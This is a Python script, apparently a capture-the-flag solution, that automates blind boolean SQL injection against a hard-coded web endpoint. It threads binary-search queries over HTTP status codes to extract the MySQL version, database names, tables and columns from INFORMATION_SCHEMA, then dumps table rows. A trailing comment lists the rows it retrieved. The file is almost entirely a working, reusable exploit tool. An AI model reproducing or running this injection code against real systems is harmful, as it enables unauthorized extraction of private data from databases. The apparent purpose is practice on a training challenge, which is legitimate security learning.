#!/usr/bin/python3
# -*- coding: utf-8 -*-

import sys
if sys.version_info.major<3:
    print("Python3 required")
    sys.exit(0)

import urllib.parse
import requests
from time import sleep

import threading
maxthreads = 10

#BOOLEAN SETTINGS
string_true = string_false = string_error = code_true = code_false = code_error = None

string_true = None
string_false = None
string_error = None

code_true = 500
code_false = 404
code_error = None

def cleanList(items):
    a = [x if x!=None else '_' for x in items]
    b = ''.join(a)
    return b.rstrip('_')


def worker(i, x):
    global finished, result, threadLimiter

    ct = threading.currentThread()
    threadLimiter.acquire()

    if finished!=False and i>finished:
        threadLimiter.release()
        return

    (campo, table, where, limit, func1, func1b, func2, func2b, xmin, xmax) = x

    # Comprobamos que el valor exista
    payload = genpayload(campo, table, where, limit, func1, func1b, func2, func2b, str(i+1),'1')
    ret = request(payload)
    if ret == False:
        finished = i if finished==False or i<finished else finished
        threadLimiter.release()
        return

    while True:
        req = int((xmin+xmax)/2)+1

        if finished!=False and i>finished:
            threadLimiter.release()
            return

        payload = genpayload(campo, table, where, limit, func1, func1b, func2, func2b, str(i+1),(str(req)))
        ret = request(payload)

        if ret == True:
            xmin = req

        elif ret == False:
            xmax = req - 1

        else:
            print("Error! %s - %s" % (code, payload))
            sys.exit()

        if xmin==xmax:
            break

    result[i] = chr(xmin)
    string = cleanList(result)
    sys.stdout.write("\r"+string)
    sys.stdout.flush()
    threadLimiter.release()


def request(payload):
    url = 'http://35.196.135.216:5001/cbbf0e9920/fetch?id=3'

    user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240'
    headers = { 'User-Agent' : user_agent, 'Connection': 'keep-alive'}

    url = url + urllib.parse.quote(payload)

    while True:
        try:
            r = requests.get(url, headers=headers)
            data = r.text
            code = r.status_code
            #print("%s %s %s" % (payload, code, data)) #DEBUG
        except KeyboardInterrupt:
            sys.exit()
        except:
            print(payload)
            print("\n[-] Request Error! ")
            sleep(0.1)
            continue
        break

    # TRUE
    if (string_true is not None and string_true in data) or (code_true is not None and code_true==code):
        return True

    # FALSE
    elif (string_false is not None and string_false in data) or (code_false is not None and code_false==code):
        return False

    else:
        if (string_true is None and code_true is None):
            return True
        elif (string_false is None and code_false is None):
            return False
        else:
            print("Error! %s - %s" % (code, payload))
            sys.exit()


def get(x, length):
    global finished, result

    finished = False
    result = [None] * length

    threads = []
    for i in range(0, length):
        tr = threading.Thread(target=worker, args=(i,x, ))
        threads.append(tr)
        tr.start()

    for n in threads:
        n.join()

    if finished is False:
        finished = length

    #print("\nFIN %s LEN %s" % (finished, length))
    print('\r'+ ''.join(result[:min(finished,length)])+'')
    return ''.join(result[:min(finished,length)])


def execute(campo, table, where, limit):

    # Paso1: COUNT
    (func1, func1b) = ('count(distinct(', '))')
    (func2, func2b) = ('', '')
    (xmin, xmax) = (ord('0'), ord('9'))
    x = (campo, table, where, limit, func1, func1b, func2, func2b, xmin, xmax)
    count = int(get(x, 32))
    #print(out)

    out = []
    # Paso2: foreach: LENGTH
    for limit in range(0, count):
        (func1, func1b) = ('DISTINCT(HEX(', '))')
        (func2, func2b) = ('LENGTH(', ')')
        (xmin, xmax) = (ord('0'), ord('9'))
        x = (campo, table, where, limit, func1, func1b, func2, func2b, xmin, xmax)
        length = int(get(x, 32))

    # Paso3: GET letter
        (func1, func1b) = ('DISTINCT(HEX(', '))')
        (func2, func2b) = ('', '')
        (xmin, xmax) = (ord('0'), ord('F'))
        x = (campo, table, where, limit, func1, func1b, func2, func2b, xmin, xmax)
        outhex = get(x, length)
        out.append(bytes.fromhex(outhex).decode('utf-8'))

    return out


def genpayload(campo, table, where, limit, func1, func1b, func2, func2b, n, x):

    if table is not None:
        table = " FROM %s" % table
    else:
        table = ''

    if where is not None:
        where = " WHERE %s" % where
    else:
        where = ''

    if limit is not None:
        limit = " LIMIT %s,1" % limit
    else:
        limit = ''

    # Between
    payload = '&&ORD(MID('+func2+'(SeLEcT '+func1+''+campo+''+func1b+''+table+''+where+''+limit+')'+func2b+','+n+',1))between('+x+')and(256)'

    # >=
    #payload = '&&ORD(MID('+func2+'(SeLEcT '+func1+''+campo+''+func1b+''+table+''+where+''+limit+')'+func2b+','+n+',1))>='+x+''

    return payload


def get_version():
    print("[+] Mysql Version")
    campo = "version()"
    table = None
    where = None
    limit = None

    version = execute(campo, table, where, limit)
    return version


def get_database():
    print("[+] Mysql Current DB")
    campo = "database()"
    table = None
    where = None
    limit = None
    currentdb = execute(campo, table, where, limit)
    return currentdb


def get_databases():
    print("[+] MySQL Databases")
    campo = "table_schema"
    table = "INFORMATION_SCHEMA.tables"
    where = "table_schema!=0x494e464f524d4154494f4e5f534348454d41"
    #where = "table_schema=database()"
    limit = None
    currentdb = execute(campo, table, where, limit)
    return currentdb


def get_tables(db):
    print("[+] MySQL Tables - %s" % db)
    campo = "table_name"
    table = "INFORMATION_SCHEMA.tables"
    where = "table_schema=0x"+db.encode("utf-8").hex()
    limit = None
    tables = execute(campo, table, where, limit)
    out = []
    for tb in tables:
        out.append([db, tb])
    return out


def get_columns(tb): #TODO, select db
    print("[+] MySQL Columns - %s" % tb)
    campo = "column_name"
    table = "INFORMATION_SCHEMA.columns"
    where = "table_name=0x"+tb.encode("utf-8").hex()
    limit = None
    columns = execute(campo, table, where, limit)
    return columns


def get_dump(db, tb, cols):
    print("[+] MySQL DUMP - %s" % tb)
    campo = 'concat('+',0x7c,'.join(cols)+')'
    table = "%s.%s" % (db, tb)
    where = None
    limit = None
    dump = execute(campo, table, where, limit)
    return dump


def main():
    global threadLimiter
    threadLimiter = threading.BoundedSemaphore(maxthreads)
    #print( get_version() ) # 10.1.26-MariaDB-0+deb9u1
    #print( get_database() ) # level5

    databases = []
    databases = ['level5', 'mysql', 'performance_schema']
    databases = ['level5']
    if len(databases) == 0:
        databases = get_databases() # OK
    print(databases)

    tables = []
    tables = [[['level5', 'albums'], ['level5', 'photos']]]
    if len(tables) == 0:
        for db in databases:
            tables.append(  get_tables(db) ) # OK
        #tables = get_tables('level5')
    print(tables)

    columns = []
    columns = [['level5', 'albums', ['id', 'title']], ['level5', 'photos', ['id', 'title', 'filename', 'parent']]]
    if len(columns) == 0:
        for db in tables:
            print("DB: %s" % db)
            for tb in db:
                print(tb)
                col = get_columns(tb[1])
                print(col)
                columns.append( [tb[0], tb[1], col ] )
    print(columns)

    for tb in columns:
        print('[+] Get DB:%s TABLE:%s COLUMNS:%s' % (tb[0], tb[1], tb[2]))
        dump = get_dump(tb[0], tb[1], tb[2])
        print(dump)

"""
ALBUMS -> ['id', 'title']
    ['1|Kittens']

PHOTOS -> ['id', 'title', 'filename', 'parent']
    [
    '1|Utterly adorable|files/adorable.jpg|1',
    '2|Purrfect|files/purrfect.jpg|1',
    '3|Invisible|7fd48bdbf67c0c17dbae6d6e83406b2d5ddad34f0dbfd4b805da13cc747dae3c|1']
"""

if __name__ == "__main__":
    main()
